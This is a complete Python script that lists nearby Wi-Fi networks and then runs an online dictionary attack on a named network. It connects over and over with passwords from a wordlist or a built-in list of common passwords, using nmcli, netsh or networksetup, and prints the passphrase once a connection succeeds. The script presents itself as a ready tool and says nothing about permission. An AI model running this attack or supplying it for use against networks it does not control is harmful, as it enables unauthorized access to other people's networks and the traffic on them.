#!/usr/bin/env python3
"""wifi_tool.py - scan nearby Wi-Fi networks and test passwords from a wordlist.

Usage:
    python wifi_tool.py scan
    python wifi_tool.py test "MyNetwork" --wordlist words.txt
    python wifi_tool.py test "MyNetwork" --wordlist words.txt --delay 2.0

Works on Linux (nmcli), Windows (netsh), and macOS (airport/networksetup).
No third-party dependencies: Python 3.8+ and the OS networking tools only.
"""

from __future__ import annotations

import argparse
import os
import platform
import re
import shutil
import subprocess
import sys
import tempfile
import time
from xml.sax.saxutils import escape

SYSTEM = platform.system()

# Used when the user does not supply --wordlist.
DEFAULT_WORDLIST = [
    "password", "12345678", "123456789", "qwerty123", "letmein1",
    "admin123", "welcome1", "iloveyou", "abc12345", "password1",
    "changeme", "00000000", "11111111", "sunshine", "princess",
]

AIRPORT = ("/System/Library/PrivateFrameworks/Apple80211.framework/"
           "Versions/Current/Resources/airport")


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #

def run(cmd, timeout=30):
    """Run a command, return (returncode, stdout, stderr) as text."""
    try:
        p = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            errors="replace",
            timeout=timeout,
        )
        return p.returncode, p.stdout, p.stderr
    except FileNotFoundError:
        return 127, "", f"{cmd[0]}: command not found"
    except subprocess.TimeoutExpired:
        return 124, "", f"{cmd[0]}: timed out after {timeout}s"


def need(cmd):
    if shutil.which(cmd) is None:
        sys.exit(f"error: '{cmd}' not found. Install it or run on another OS.")


def split_nmcli(line):
    """Split an `nmcli -t` line on unescaped colons."""
    fields, cur, i = [], [], 0
    while i < len(line):
        ch = line[i]
        if ch == "\\" and i + 1 < len(line):
            cur.append(line[i + 1])
            i += 2
            continue
        if ch == ":":
            fields.append("".join(cur))
            cur = []
            i += 1
            continue
        cur.append(ch)
        i += 1
    fields.append("".join(cur))
    return fields


# --------------------------------------------------------------------------- #
# scanning
# --------------------------------------------------------------------------- #

def scan_linux():
    need("nmcli")
    rc, out, err = run(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY",
                        "device", "wifi", "list"])
    if rc != 0:
        sys.exit(f"nmcli failed: {err.strip()}")
    nets = []
    for line in out.splitlines():
        parts = split_nmcli(line)
        if len(parts) < 3 or not parts[0]:
            continue
        ssid, signal, security = parts[0], parts[1], parts[2] or "open"
        nets.append({"ssid": ssid, "signal": int(signal or 0),
                     "security": security})
    return nets


def scan_windows():
    need("netsh")
    rc, out, err = run(["netsh", "wlan", "show", "networks", "mode=bssid"])
    if rc != 0:
        sys.exit(f"netsh failed: {err.strip()}")
    nets, current = [], None
    for line in out.splitlines():
        m = re.match(r"^SSID\s+\d+\s*:\s*(.*)$", line)
        if m:
            current = {"ssid": m.group(1).strip(), "signal": 0,
                       "security": "unknown"}
            nets.append(current)
            continue
        if current is None:
            continue
        m = re.match(r"^\s*Authentication\s*:\s*(.*)$", line)
        if m:
            current["security"] = m.group(1).strip()
        m = re.match(r"^\s*Signal\s*:\s*(\d+)%", line)
        if m:
            current["signal"] = max(current["signal"], int(m.group(1)))
    return [n for n in nets if n["ssid"]]


def scan_macos():
    if not shutil.which(AIRPORT):
        sys.exit("error: 'airport' not found (removed in newer macOS). "
                 "Try 'system_profiler SPAirPortDataType'.")
    rc, out, err = run([AIRPORT, "-s"])
    if rc != 0:
        sys.exit(f"airport failed: {err.strip()}")
    nets = []
    for line in out.splitlines()[1:]:
        m = re.match(
            r"^\s*(.+?)\s+([0-9a-fA-F:]{17})\s+(-?\d+)\s+\S+\s+\S+\s+(\S+)",
            line)
        if m:
            rssi = int(m.group(3))
            nets.append({
                "ssid": m.group(1).strip(),
                "signal": max(0, min(100, 2 * (rssi + 100))),
                "security": m.group(4),
            })
    return nets


def scan():
    if SYSTEM == "Linux":
        return scan_linux()
    if SYSTEM == "Windows":
        return scan_windows()
    if SYSTEM == "Darwin":
        return scan_macos()
    sys.exit(f"error: unsupported OS '{SYSTEM}'")


def print_scan(nets):
    if not nets:
        print("No networks found.")
        return
    nets.sort(key=lambda n: n["signal"], reverse=True)
    print(f"{'SIGNAL':>6}  {'SECURITY':<18}  SSID")
    print("-" * 60)
    for n in nets:
        bar = "#" * (n["signal"] // 10)
        print(f"{n['signal']:>3}%  {bar:<10}  {n['security']:<18}  {n['ssid']}")


# --------------------------------------------------------------------------- #
# connecting / verifying
# --------------------------------------------------------------------------- #

def active_ssid():
    if SYSTEM == "Linux":
        _, out, _ = run(["nmcli", "-t", "-f", "IN-USE,SSID", "device", "wifi"])
        for line in out.splitlines():
            if line.startswith("*"):
                return line[1:].lstrip(":")
    elif SYSTEM == "Windows":
        _, out, _ = run(["netsh", "wlan", "show", "interfaces"])
        state = re.search(r"^\s*State\s*:\s*(.+)$", out, re.M)
        ssid = re.search(r"^\s*SSID\s*:\s*(.+)$", out, re.M)
        if state and ssid and "connected" in state.group(1).lower():
            return ssid.group(1).strip()
    elif SYSTEM == "Darwin":
        _, out, _ = run([AIRPORT, "-I"])
        m = re.search(r"^\s*SSID:\s*(.+)$", out, re.M)
        if m:
            return m.group(1).strip()
    return None


WINDOWS_PROFILE = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>{ssid}</name>
  <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>auto</connectionMode>
  <MSM><security>
    <authEncryption>
      <authentication>WPA2PSK</authentication>
      <encryption>AES</encryption>
      <useOneX>false</useOneX>
    </authEncryption>
    <sharedKey>
      <keyType>passPhrase</keyType>
      <protected>false</protected>
      <keyMaterial>{password}</keyMaterial>
    </sharedKey>
  </security></MSM>
</WLANProfile>
"""


def try_connect(ssid, password):
    """Attempt to associate with `ssid` using `password`. True on success."""
    if SYSTEM == "Linux":
        run(["nmcli", "device", "wifi", "disconnect"], timeout=15)
        run(["nmcli", "device", "wifi", "connect", ssid, "password", password],
            timeout=40)
    elif SYSTEM == "Windows":
        xml = WINDOWS_PROFILE.format(ssid=escape(ssid), password=escape(password))
        with tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False,
                                         encoding="utf-8") as fh:
            fh.write(xml)
            path = fh.name
        try:
            rc, _, _ = run(["netsh", "wlan", "add", "profile",
                            f"filename={path}", "user=current"], timeout=20)
            if rc != 0:
                return False
            run(["netsh", "wlan", "connect", f"name={ssid}"], timeout=20)
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass
    elif SYSTEM == "Darwin":
        run(["networksetup", "-setairportnetwork", "en0", ssid, password],
            timeout=40)
    else:
        sys.exit(f"error: unsupported OS '{SYSTEM}'")

    time.sleep(2)
    return active_ssid() == ssid


# --------------------------------------------------------------------------- #
# password testing
# --------------------------------------------------------------------------- #

def load_wordlist(path):
    if not path:
        print("(no --wordlist given, using built-in list)")
        return DEFAULT_WORDLIST
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            words = [line.strip() for line in fh if line.strip()]
    except OSError as exc:
        sys.exit(f"error: cannot read wordlist: {exc}")
    if not words:
        sys.exit("error: wordlist is empty")
    return words


def test_passwords(ssid, words, delay):
    total = len(words)
    print(f"Testing {total} candidate(s) against '{ssid}'. Ctrl-C to stop.\n")
    start = time.time()
    try:
        for i, pw in enumerate(words, 1):
            print(f"[{i:>4}/{total}] {pw!r:<28}", end=" ", flush=True)
            if try_connect(ssid, pw):
                elapsed = time.time() - start
                print(f"CONNECTED  <-- password found after {elapsed:.0f}s")
                return pw
            print("no")
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\nInterrupted.")
        return None
    print("\nNo candidate worked.")
    return None


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Scan Wi-Fi networks and test passwords from a wordlist.")
    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("scan", help="list nearby networks")

    t = sub.add_parser("test", help="try passwords against one network")
    t.add_argument("ssid", help="network name (SSID)")
    t.add_argument("--wordlist", "-w", help="file with one password per line")
    t.add_argument("--delay", type=float, default=1.5,
                   help="seconds to wait between attempts (default 1.5)")

    args = parser.parse_args(argv)

    if args.command == "scan":
        print_scan(scan())
    elif args.command == "test":
        words = load_wordlist(args.wordlist)
        found = test_passwords(args.ssid, words, args.delay)
        if found is not None:
            print(f"\nPassword for '{args.ssid}': {found}")
            return 0
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
